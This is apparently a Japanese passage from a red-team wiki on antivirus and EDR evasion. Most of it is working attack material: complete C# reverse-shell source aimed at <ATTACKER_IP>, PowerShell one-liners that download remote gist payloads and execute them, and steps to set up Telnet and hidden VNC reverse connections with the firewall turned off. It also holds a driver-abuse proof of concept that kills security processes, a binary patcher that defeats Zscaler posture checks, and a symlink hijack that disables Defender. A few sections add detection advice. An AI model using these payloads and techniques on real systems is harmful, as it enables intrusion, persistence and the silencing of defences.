[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
これは、[PackMyPayload](https://github.com/mgeeky/PackMyPayload/) を使用して payloads を ISO files 内にパッケージ化し、SmartScreen を bypass するデモです。

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) は、Windows における強力な logging mechanism であり、applications や system components が **events を log** できるようにします。しかし、security products によって malicious activities の監視および検出に使用されることもあります。

AMSI を disabled (bypassed) にする方法と同様に、user space process の **`EtwEventWrite`** function を、events を log せずに即座に return するようにすることも可能です。これは function を memory 内で patch して即座に return させることで実行され、その process における ETW logging を effectively disabled にします。

詳細については、**[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) および [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** を参照してください。<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

C# binaries を memory 内に load する方法は以前から知られており、AV に検出されずに post-exploitation tools を実行する非常に優れた方法であり続けています。

payload は disk に触れることなく直接 memory に load されるため、process 全体の AMSI を patch することだけを考慮すれば済みます。

ほとんどの C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc など) は、C# assemblies を直接 memory 内で execute する機能をすでに提供していますが、その方法にはいくつかの異なる選択肢があります。

- **Fork\&Run**

**新しい sacrificial process を spawn** し、その新しい process に post-exploitation の malicious code を inject して実行し、完了したら新しい process を kill します。この方法には利点と欠点の両方があります。fork and run method の利点は、execution が **Beacon implant process の外部**で行われることです。つまり、post-exploitation action で何か問題が発生したり検出されたりしても、**implant が survive する可能性がはるかに高くなります。** 欠点は、**Behavioural Detections** によって検出される可能性が高くなることです。

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

これは、post-exploitation の malicious code を**自身の process 内に** inject する方法です。これにより、新しい process を作成して AV に scan されることを避けられますが、payload の execution で問題が発生した場合、crash する可能性があるため、**beacon を失う**可能性が**はるかに高くなります。**

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly loading についてさらに詳しく知りたい場合は、この記事 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) と、InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)) を確認してください。

C# Assemblies は **PowerShell から** load することもできます。[Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) と [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk) を確認してください。

## Using Other Programming Languages

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) で提案されているように、**Attacker Controlled SMB share にインストールされた interpreter environment** への access を compromised machine に与えることで、他の languages を使用して malicious code を execute できます。

SMB share 上の Interpreter Binaries と environment への access を許可することで、compromised machine の **memory 内でこれらの languages の arbitrary code を execute** できます。

repo によると、Defender は scripts を引き続き scan しますが、Go、Java、PHP などを利用することで、**static signatures を bypass する柔軟性が高まります**。これらの languages で random な un-obfuscated reverse shell scripts を使用した testing は成功しています。

## TokenStomping

Token stomping は、EDR や AV などの security product の access token を manipulate します。token の privileges を減らすことで、process を実行したまま、privileged inspection や remediation actions を実行できないようにできます。

これを防ぐために、Windows は **external processes** が security processes の tokens に対する handles を取得することを**防止**できます。

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

[**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) で説明されているように、victim の PC に Chrome Remote Desktop を deploy し、それを使用して takeover と persistence の維持を行うのは簡単です。<sup>[[35]](#references)</sup>
1. https://remotedesktop.google.com/ から download し、「Set up via SSH」を click してから、Windows 用の MSI file を click して MSI file を download します。
2. victim 上で installer を silently 実行します（admin required）：`msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop page に戻り、next を click します。wizard が authorize を求めるので、Authorize button を click して続行します。
4. 必要な調整を加えて、提供された command を execute します：`"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111`（`--pin` parameter は GUI を使用せずに PIN を設定します）


## Advanced Evasion

Evasion は非常に複雑な topic です。1 つの system 内だけでも、telemetry のさまざまな sources を考慮しなければならない場合があるため、成熟した environments で完全に undetected の状態を維持することはほぼ不可能です。

攻撃するすべての environment には、それぞれ独自の strengths と weaknesses があります。

より Advanced Evasion techniques の足がかりを得るために、[@ATTL4S](https://twitter.com/DaniLJ94) によるこの talk をぜひ視聴することを強く勧めます。


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

これは、[@mariuszbit](https://twitter.com/mariuszbit) による Evasion in Depth についての、もう 1 つの素晴らしい talk です。


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) を使用すると、**Defender が malicious と判断している部分を特定するまで binary の一部を** **remove** し、その部分を分割して提示できます。\
**同じことを行う**別の tool は [**avred**](https://github.com/dobin/avred) で、[**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) にはこの service を提供する open web interface があります。

### **Telnet Server**

Windows10 までは、すべての Windows に **Telnet server** が付属しており、次のコマンドを実行して（administrator として）install できました。
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
システム起動時に**開始**し、今すぐ**実行**する：
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet portを変更**（stealth）し、firewallを無効化する:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

こちらから download します: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html)（setup ではなく、bin downloads を使用します）

**ホスト上で**: _**winvnc.exe**_ を実行し、server を設定します:

- _Disable TrayIcon_ オプションを有効にする
- _VNC Password_ に password を設定する
- _View-Only Password_ に password を設定する

その後、binary _**winvnc.exe**_ と**新たに**作成された file _**UltraVNC.ini**_ を **victim** 内に移動します

#### **Reverse connection**

**attacker** は自身の **host 内で** binary `vncviewer.exe -listen 5900` を**実行**し、Reverse **VNC connection** を受け取れるように**準備**します。次に、**victim** 内で winvnc daemon `winvnc.exe -run` を起動し、`winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` を実行します

**WARNING:** stealth を維持するには、いくつかの操作を行わないでください

- すでに実行中の場合は `winvnc` を起動しないでください。起動すると [popup](https://i.imgur.com/1SROTTl.png) が表示されます。`tasklist | findstr winvnc` で実行中か確認してください
- 同じ directory に `UltraVNC.ini` がない状態で `winvnc` を起動しないでください。起動すると [the config window](https://i.imgur.com/rfMQWcf.png) が開きます
- help を表示するために `winvnc -h` を実行しないでください。[popup](https://i.imgur.com/oc18wcu.png) が表示されます

### GreatSCT

こちらから download します: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCTの内部:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
ここで、`msfconsole -r file.rc` を使って **リスナーを起動**し、次のコマンドで **XML payloadを実行**します:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**現在のDefenderはプロセスを非常に速く終了させます。**

### 独自の reverse shell のコンパイル

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### First C# Revershell

次のコマンドでコンパイルします：
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
これと併用します：
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# コンパイラの使用
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

自動ダウンロードと実行：
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators list: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### injectorをbuildするためのpythonの使用例:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### その他のtools
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### その他

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Kernel Space から AV/EDR を停止する

Storm-2603 は、ransomware を投下する前に endpoint protections を無効化するため、**Antivirus Terminator** と呼ばれる小さな console utility を利用しました。この tool は**独自の脆弱だが *signed* な driver**を持ち込み、それを悪用して、Protected-Process-Light (PPL) AV services でさえ block できない privileged kernel operations を実行します。<sup>[[12]](#references)</sup>

主なポイント
1. **Signed driver**: disk に配信される file は `ServiceMouse.sys` ですが、binary は Antiy Labs の「System In-Depth Analysis Toolkit」に含まれる、正規に signed された driver `AToolsKrnl64.sys` です。この driver には有効な Microsoft signature が付いているため、Driver-Signature-Enforcement (DSE) が enabled でも load されます。
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
1 行目で driver を**kernel service**として登録し、2 行目で起動することで、user land から `\\.\ServiceMouse` に access できるようになります。
3. **Driver が expose する IOCTLs**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | PID により任意の process を terminate（Defender/EDR services の kill に使用） |
| `0x990000D0` | disk 上の任意の file を delete |
| `0x990001D0` | driver を unload して service を remove |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **なぜ機能するのか**: BYOVD は user-mode protections を完全に bypass します。kernel で実行される code は、PPL/PP、ELAM、その他の hardening features に関係なく、*protected* processes を open して terminate したり、kernel objects を tamper したりできます。

Detection / Mitigation
•  Microsoft の vulnerable-driver block list（`HVCI`、`Smart App Control`）を enabled にし、Windows が `AToolsKrnl64.sys` を load しないようにします。
•  新しい *kernel* services の作成を monitor し、world-writable directory から driver が load された場合、または allow-list に存在しない場合に alert を発生させます。
•  user-mode handles による custom device objects への access と、その後に続く suspicious な `DeviceIoControl` calls を監視します。

### On-Disk Binary Patching による Zscaler Client Connector Posture Checks の Bypass

Zscaler の **Client Connector** は device-posture rules を local に適用し、結果を他の components に伝達するために Windows RPC に依存しています。2 つの弱い design choices により、完全な bypass が可能です。

1. Posture evaluation が**完全に client-side**で行われる（boolean が server に送信される）。
2. Internal RPC endpoints は、接続する executable が Zscaler によって **signed** されていること（`WinVerifyTrust` 経由）だけを validate します。<sup>[[11]](#references)</sup>

**disk 上の 4 つの signed binaries を patch**することで、両方の mechanisms を neutralise できます。

| Binary | Patch される Original logic | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 常に `1` を return するため、すべての check が compliant になる |
| `ZSAService.exe` | `WinVerifyTrust` への indirect call | NOP 化 ⇒ unsigned process を含む任意の process が RPC pipes に bind できる |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` に置換 |
| `ZSATunnel.exe` | tunnel の integrity checks | Short-circuit される |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
ファイルを元のものと置き換え、service stackを再起動した後:

* **すべての** posture checks が **green/compliant** と表示される。
* unsigned または modified binaries が named-pipe RPC endpoints（例: `\\RPC Control\\ZSATrayManager_talk_to_me`）を開ける。
* compromised host が、Zscaler policiesで定義された internal network に無制限でアクセスできる。

この case study は、純粋な client-side trust decisions と単純な signature checks が、数バイトの patches だけで突破できることを示している。

## Protected Process Light (PPL) を悪用して LOLBINs で AV/EDR を改変する

Protected Process Light (PPL) は signer/level hierarchy を適用し、同等以上の protected processes だけが相互に tamper できるようにする。Offensively、PPL-enabled binary を正当に起動し、その arguments を制御できる場合、benign functionality（例: logging）を、AV/EDR が使用する protected directories に対する、制約付きの PPL-backed write primitive に変換できる。<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

プロセスを PPL として実行するための条件
- 対象の EXE（および読み込まれるすべての DLLs）は、PPL-capable EKU で署名されている必要がある。
- プロセスは、次の flags を使用して CreateProcess で作成する必要がある: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`。
- binary の signer に一致する compatible protection level を要求する必要がある（例: anti-malware signers には `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`、Windows signers には `PROTECTION_LEVEL_WINDOWS`）。誤った levels では creation に失敗する。

PP/PPL と LSASS protection の概要については、こちらも参照:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL（protection level を選択し、arguments を対象の EXE に転送する）:
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- 署名済みのシステムバイナリ `C:\Windows\System32\ClipUp.exe` は自分自身を起動し、呼び出し元が指定したパスにログファイルを書き込むパラメータを受け付けます。
- PPL process として起動すると、ファイル書き込みは PPL backing によって実行されます。
- ClipUp はスペースを含むパスを解析できません。8.3 short paths を使用して、通常は保護されている場所を指定します。

8.3 short path helpers
- Short names を一覧表示するには、各親ディレクトリで `dir /x` を実行します。
- cmd で short path を導出するには、`for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA` を使用します。

Abuse chain (abstract)
1) Launcher（例: CreateProcessAsPPL）を使用し、`CREATE_PROTECTED_PROCESS` で PPL-capable LOLBIN（ClipUp）を起動します。
2) ClipUp の log-path argument により、保護された AV directory（例: Defender Platform）でファイルが作成されるようにします。必要に応じて 8.3 short names を使用します。
3) 対象の binary が実行中に AV によって通常 open/locked されている場合（例: MsMpEng.exe）、AV が起動する前の boot 時に write が行われるよう、確実に早い段階で実行される auto-start service をインストールして write をスケジュールします。Process Monitor（boot logging）で boot ordering を検証します。
4) Reboot 後、PPL-backed write が AV による binary の lock より前に実行され、対象ファイルが破損して startup が妨げられます。

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- ClipUp が書き込む内容を配置場所以外で制御することはできません。この primitive は、正確な内容の injection よりも破損に適しています。
- service の install/start と reboot window には local admin/SYSTEM が必要です。
- Timing が critical です。target が open であってはなりません。boot-time execution により file lock を回避できます。

Detections
- `ClipUp.exe` の process creation。特に、boot 付近で non-standard launcher を parent とする通常とは異なる arguments。
- suspicious binary を auto-start するよう設定された新しい services、および Defender/AV より常に先に起動する services。Defender startup failures の前に行われた service creation/modification を調査します。
- Defender binaries/Platform directories の file integrity monitoring。protected-process flags を持つ processes による予期しない file creations/modifications。
- ETW/EDR telemetry: `CREATE_PROTECTED_PROCESS` で作成された processes、および non-AV binaries による anomalous PPL level usage を探します。

Mitigations
- WDAC/Code Integrity: PPL として実行できる signed binaries、およびその parents を制限します。正当な contexts 以外での ClipUp invocation を block します。
- Service hygiene: auto-start services の creation/modification を制限し、start-order manipulation を monitor します。
- Defender tamper protection と early-launch protections が有効であることを確認し、binary corruption を示す startup errors を調査します。
- 環境との互換性がある場合は、security tooling を配置する volumes での 8.3 short-name generation の無効化を検討します（十分に test してください）。

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender は、次の場所にある subfolders を列挙することで、実行元の platform を選択します。
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

最も高い lexicographic version string（例: `4.18.25070.5-0`）を持つ subfolder を選択し、そこから Defender service processes を起動します（service/registry paths もそれに応じて更新されます）。この選択では、directory reparse points（symlinks）を含む directory entries が信頼されます。administrator はこれを利用して Defender を attacker-writable path に redirect し、DLL sideloading または service disruption を実現できます。<sup>[[21]](#references)[[22]](#references)</sup>

Preconditions
- Local Administrator（Platform folder 配下に directories/symlinks を作成するために必要）
- reboot、または Defender platform re-selection を trigger する能力（boot 時の service restart）
- built-in tools のみ必要（mklink）

Why it works
- Defender は自身の folders への writes を block しますが、platform selection は directory entries を信頼し、target が protected/trusted path に resolve されることを検証せずに、lexicographically highest version を選択します。

Step-by-step (example)
1) 現在の platform folder の writable clone を準備します。例: `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform 内に、自分のフォルダーを指す、より高いバージョン番号のディレクトリ symlink を作成します:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) トリガーの選択（再起動を推奨）:
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend) がリダイレクトされたパスから実行されていることを確認します。
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
新しい process path が `C:\TMP\AV\` 配下にあり、service configuration/registry にその場所が反映されていることを確認してください。

Post-exploitation options
- DLL sideloading/code execution: Defender が application directory から読み込む DLL を配置・置換し、Defender の processes で code を実行します。上記のセクションを参照してください: [DLL Sideloading & Proxying](#dll-sideloading--proxying)。
- Service kill/denial: version-symlink を削除すると、次回の start 時に configured path を解決できなくなり、Defender の start に失敗します:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> この technique は単独では privilege escalation を提供しない点に注意してください。admin rights が必要です。

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams は、runtime evasion を C2 implant から target module 自体へ移動できます。具体的には、その Import Address Table (IAT) を hooking し、選択した API を attacker-controlled な position-independent code (PIC) 経由でルーティングします。これにより、多くの kit が公開する小規模な API surface（例: CreateProcessA）を超えて evasion を一般化し、同じ保護を BOFs および post-exploitation DLLs にも適用できます。<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

High-level approach
- reflective loader（prepend または companion）を使用して、target module と並べて PIC blob を stage します。PIC は self-contained かつ position-independent でなければなりません。
- host DLL の load 時に、その IMAGE_IMPORT_DESCRIPTOR を走査し、targeted imports（例: CreateProcessA/W、CreateThread、LoadLibraryA/W、VirtualAlloc）の IAT entries を thin PIC wrappers を指すように patch します。
- 各 PIC wrapper は、real API address に tail-call する前に evasion を実行します。一般的な evasion には以下が含まれます。
- call の前後で memory を mask/unmask します（例: beacon regions の encrypt、RWX→RX、page names/permissions の変更）。その後、call 後に元へ戻します。
- Call-stack spoofing: benign な stack を構築し、target API へ transition することで、call-stack analysis が想定された frames を解決するようにします。<sup>[[9]](#references)</sup>
- compatibility のため、Aggressor script（または equivalent）が Beacon、BOFs、post-ex DLLs 用に hook する API を登録できる interface を export します。

Why IAT hooking here
- hooked import を使用するあらゆる code で機能し、tool code の変更や、特定の API を proxy するための Beacon への依存を必要としません。
- post-ex DLLs をカバーします。LoadLibrary* を hooking することで、module loads（例: System.Management.Automation.dll、clr.dll）を intercept し、それらの API calls に同じ masking/stack evasion を適用できます。
- CreateProcessA/W を wrapping することで、call-stack–based detections に対して process-spawning post-ex commands を確実に使用できるようにします。

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- relocations/ASLR の後、import を初めて使用する前に patch を適用する。TitanLdr/AceLdr のような Reflective loader は、ロードされた module の DllMain 中に hooking を行う例である。
- wrapper は小さく、PIC-safe に保つ。true API は、patch 前に取得しておいた元の IAT 値、または LdrGetProcedureAddress 経由で解決する。
- PIC では RW → RX の遷移を使用し、書き込み可能かつ実行可能なページを残さない。

Call-stack spoofing stub
- Draugr-style の PIC stub は、benign module 内の return address を使って fake call chain を構築し、その後 real API へ pivot する。
- これにより、Beacon/BOFs から sensitive API へ到達する際に canonical stack を想定する detection を回避する。
- stack cutting/stack stitching technique と組み合わせ、API prologue の前に想定される frame 内へ到達させる。

Operational integration
- reflective loader を post-ex DLL の先頭に付加し、DLL のロード時に PIC と hooks が自動的に初期化されるようにする。
- Aggressor script を使用して target API を登録し、code changes なしで Beacon と BOFs が同じ evasion path の恩恵を透過的に受けられるようにする。

Detection/DFIR considerations
- IAT integrity: non-image（heap/anon）address に解決される entry、import pointer の定期的な検証。
- Stack anomalies: loaded image に属さない return address、non-image PIC への突然の遷移、一貫性のない RtlUserThreadStart ancestry。
- Loader telemetry: in-process による IAT への書き込み、import thunk を変更する early DllMain activity、load 時に作成される予期しない RX region。
- Image-load evasion: hooking LoadLibrary* を使用する場合、memory masking event と相関する automation/clr assembly の suspicious な load を監視する。

Related building blocks and examples
- load 中に IAT patching を実行する reflective loader（例: TitanLdr、AceLdr）
- memory masking hooks（例: simplehook）と stack-cutting PIC（stackcutting）
- PIC call-stack spoofing stub（例: Draugr）


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### resident PICO 経由の Import-time IAT hooks

reflective loader を制御できる場合、custom resolver で loader の `GetProcAddress` pointer を置き換え、hooks を先に確認することで、`ProcessImports()` **中に** imports を hook できる:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- transient loader PIC が自身を解放した後も存続する **resident PICO**（persistent PIC object）を構築する。
- `setup_hooks()` function を export し、loader の import resolver を上書きする（例: `funcs.GetProcAddress = _GetProcAddress`）。
- `_GetProcAddress` では ordinal imports をスキップし、`__resolve_hook(ror13hash(name))` のような hash-based hook lookup を使用する。hook が存在する場合はそれを返し、存在しない場合は real `GetProcAddress` に委譲する。
- Crystal Palace の `addhook "MODULE$Func" "hook"` entry を使い、link time に hook target を登録する。hook は resident PICO 内に存在するため有効なままとなる。

これにより、load 後に loaded DLL の code section を patch することなく、**import-time IAT redirection** が実現する。

### target が PEB-walking を使用する場合に hook 可能な imports を強制する

import-time hooks は、function が実際に target の IAT 内に存在する場合にのみ発動する。module が PEB-walk + hash（import entry なし）で API を解決する場合は、loader の `ProcessImports()` path がそれを認識できるよう、実際の import を強制する:

- hashed export resolution（例: `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`）を、`&WaitForSingleObject` のような direct reference に置き換える。
- compiler が IAT entry を生成するため、reflective loader が imports を解決する際に interception が可能になる。

### `Sleep()` を patch しない Ekko-style sleep/idle obfuscation

